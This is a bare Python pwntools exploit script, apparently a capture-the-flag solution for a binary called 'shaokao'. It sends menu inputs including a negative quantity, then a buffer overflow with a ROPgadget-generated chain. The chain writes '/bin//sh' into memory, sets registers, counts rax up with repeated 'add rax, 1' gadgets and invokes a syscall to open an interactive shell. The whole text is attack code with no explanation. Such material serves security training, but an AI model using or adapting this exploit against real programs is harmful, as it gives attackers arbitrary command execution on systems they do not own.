# ROPgadget --ropchain  --binary ./shaokao

from pwn import *

s = process('./shaokao')
context(log_level='debug', arch='amd64', os='linux')

s.sendline('1')
s.sendline('1')
s.sendline('-100000')
s.sendline('3')
s.sendline('4')
s.sendline('5')
s.recv()

# ROPgadget --ropchain  --binary ./shaokao
from struct import pack

p = b'a' * (0x20 + 8)

p += pack('<Q', 0x000000000040a67e)  # pop rsi ; ret
p += pack('<Q', 0x00000000004e60e0)  # @ .data
p += pack('<Q', 0x0000000000458827)  # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x000000000045af95)  # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040a67e)  # pop rsi ; ret
p += pack('<Q', 0x00000000004e60e8)  # @ .data + 8
p += pack('<Q', 0x0000000000447339)  # xor rax, rax ; ret
p += pack('<Q', 0x000000000045af95)  # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040264f)  # pop rdi ; ret
p += pack('<Q', 0x00000000004e60e0)  # @ .data
p += pack('<Q', 0x000000000040a67e)  # pop rsi ; ret
p += pack('<Q', 0x00000000004e60e8)  # @ .data + 8
p += pack('<Q', 0x00000000004a404b)  # pop rdx ; pop rbx ; ret
p += pack('<Q', 0x00000000004e60e8)  # @ .data + 8
p += pack('<Q', 0x4141414141414141)  # padding
p += pack('<Q', 0x0000000000447339)  # xor rax, rax ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000496710)  # add rax, 1 ; ret
p += pack('<Q', 0x0000000000402404)  # syscall
s.sendline(p)
s.interactive()
